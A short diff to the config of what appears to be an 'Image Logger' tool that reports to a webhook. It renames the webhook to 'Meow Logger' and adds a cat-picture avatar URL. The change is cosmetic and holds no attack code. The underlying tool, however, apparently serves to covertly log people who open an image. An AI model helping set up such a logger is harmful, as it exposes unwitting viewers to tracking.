@@ -18,7 +18,8 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Meow Logger", # Set this to the name you want the webhook to have
+    "avatar_url": "https://preview.redd.it/random-question-but-does-anyone-have-versions-of-this-cat-v0-ya8qikz9kn0f1.png?width=1080&crop=smart&auto=webp&s=4c576b018dd510ee742502d4c71a5f796262d558", # this definetly does something
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
